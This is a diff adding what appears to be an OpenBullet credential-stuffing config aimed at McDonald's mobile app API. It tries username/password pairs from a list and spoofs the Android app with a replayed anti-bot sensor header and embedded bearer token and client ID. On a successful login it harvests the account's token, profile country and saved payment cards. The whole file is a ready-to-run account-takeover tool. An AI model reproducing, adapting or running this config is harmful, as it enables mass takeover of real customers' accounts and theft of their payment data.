@@ -1,0 +1,120 @@
+[SETTINGS]
+{
+  "Name": "MCD",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-02-10T19:27:22.9426982-05:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://us-prod.api.mcd.com/exp/v1/customer/login" 
+  CONTENT "{\"credentials\":{\"loginUsername\":\"<USER>\",\"password\":\"<PASS>\",\"type\":\"email\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "X-acf-sensor-data: 1,a,gUURL96pPDJkF/hJgmIimcnNWlXPKKqaRGtKNtOb6H4nLDW98+NkRpa7nFDZUn6TRQ5iPw3vrozAk7/lbzifUWfrYYfWFx8H0F/g/zsdX0G9j8U7i/kkzcSukBcd0Ifh80iuM4DOC9HwULL/UNxFXP8z0mAALBV5hUc9C3J+hLw=,STjYTdb9XDEiX3lRaSQqcto4B3JrNSYGPg8Y/JS4x8mxOo6TTuIzvV4a4TssDuzCFPvuu7WVXrNV3aEeoq9DoZASBkXntZvvzIgKjzlV5sAxdPvHPfAJm6+hufmSI4e4fm4KrHRNt1BbrKE82AZI4/zqoCebiapQtcs+KYSG/yw=$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$0,0,0" 
+  HEADER "mcd-clientid: 8cGckR5wPgQnFBc9deVhJ2vT94WhMBRL" 
+  HEADER "authorization: Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIiwia2lkIjoiMjAxNi0wOS0xOSJ9.0mgQn-vZDm92JodtoUQhDgSngbkxIR_i940LYcLvkiXbiPPXpIJoXw.u9VneAhTVPmTHxN3A3wr1w.Zm3d7e4fJ6QKlp7TYuuIETnv0RcKTFiHYYzGSdVlWGCsUBxGlsGwPjSqTf5eiCJ77h9RlsD5PQR8jQbJ4lpNFRdAq7UaHgLXuHYlWFdpwq5Q0wNr4uxmU6c4q0tQNib69mDbl8Aa9yXC040Tv3MQrUzO-vtB-Pjh5UsuV-I35Z1WOhz_r9FZ9gUHHSJs82anMqh9CsR986qjBPIF6PeFeurZmSjnJqQOJneIst8gw-NTLikg1xGnIIpZeuUNqR6KDHRMe7zMtGPk2r2lF1hiessXhGpnp9iKFiIMlf6awhoJj7i7yizGDPaRAZ1FH_6C1EcNBV51Z4ZMozjeYvGD7rbcnniNMTDAbsDVet_WosRcoVTaAXorLj8TI_31h72oPwIVMtwWyypHJTv--ndUzGCjSwMIyQJ_SXiFiq6gbwd5OC9CChL2L3tZw4ryA45EnrorXKPWXv3ZJ-x9sftTGfV06SjAsQ-c5IWDMu6aZWhn8eRyOOmEs1lJvhcNQ_VjXJjCahS8wD30g-c1hYVnFK6whhsYqoFy7PpfAUFodCt1rrhYgeXDerM6Scvg3ptFN4FX9Azqx-wGfm5udKwdKGW9HnCX9kuTHg5zA7QXlKTkGaqPChnOoTv-9_7NJb8AA8BhraCR55q70BZ5x9pzfHqbNlW4uUsvGGDf7RT_R5sJwSXbsJBEARZsys0wGpDSAqP7xcQSUsmFS7HJg6j7olD-QVw2vplJ-7baZHMXgpgXPX1eRnFQx5cteNiNgTRjT1xeW71gyzFqbzpJiXX5UxcUqOY_tpULZI9SjXgNgq9hQ8m0KbuwFrlJw6PvNzYJ.d3LvuiS-U05qqdfT1H7QKg" 
+  HEADER "cache-control: true" 
+  HEADER "accept-charset: UTF-8" 
+  HEADER "user-agent: MCDSDK/2.1.29 (Android; 22; en-US) GMA/6.4" 
+  HEADER "accept-language: en-US" 
+  HEADER "mcd-sourceapp: GMA" 
+  HEADER "mcd-uuid: 93e204fc-986a-4a4a-9c11-43122d640692" 
+  HEADER "mcd-marketid: US" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Content-Length: 95" 
+  HEADER "Host: us-prod.api.mcd.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "X-NewRelic-ID: UwUDUVNVGwIGVVRTDwgDVQ==" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Login is successful" 
+  KEYCHAIN Failure OR 
+    KEY "Login request has failed" 
+
+PARSE "<SOURCE>" LR "\"accessToken\": \"" "\"" -> VAR "TOKEN" 
+
+REQUEST GET "https://us-prod.api.mcd.com/exp/v1/customer/profile" 
+  
+  HEADER "mcd-clientid: 8cGckR5wPgQnFBc9deVhJ2vT94WhMBRL" 
+  HEADER "authorization: Bearer <TOKEN>" 
+  HEADER "cache-control: true" 
+  HEADER "accept-charset: UTF-8" 
+  HEADER "user-agent: MCDSDK/2.1.29 (Android; 22; en-US) GMA/6.4" 
+  HEADER "accept-language: en-US" 
+  HEADER "mcd-sourceapp: GMA" 
+  HEADER "mcd-uuid: 93e204fc-986a-4a4a-9c11-43122d640692" 
+  HEADER "mcd-marketid: US" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Content-Length: 95" 
+  HEADER "Host: us-prod.api.mcd.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "X-NewRelic-ID: UwUDUVNVGwIGVVRTDwgDVQ==" 
+
+PARSE "<SOURCE>" LR "\"country\": \"" "\"" CreateEmpty=FALSE -> CAP "COUNTRY" 
+
+REQUEST GET "https://us-prod.api.mcd.com/exp/v0/order/payments" 
+  
+  HEADER "mcd-clientid: 8cGckR5wPgQnFBc9deVhJ2vT94WhMBRL" 
+  HEADER "authorization: Bearer <TOKEN>" 
+  HEADER "cache-control: true" 
+  HEADER "accept-charset: UTF-8" 
+  HEADER "user-agent: MCDSDK/2.1.29 (Android; 22; en-US) GMA/6.4" 
+  HEADER "accept-language: en-US" 
+  HEADER "mcd-sourceapp: GMA" 
+  HEADER "mcd-uuid: 93e204fc-986a-4a4a-9c11-43122d640692" 
+  HEADER "mcd-marketid: US" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Content-Length: 95" 
+  HEADER "Host: us-prod.api.mcd.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "X-NewRelic-ID: UwUDUVNVGwIGVVRTDwgDVQ==" 
+
+PARSE "<SOURCE>" LR "\"paymentCards\": [" "]" CreateEmpty=FALSE -> CAP "CARD" 
+
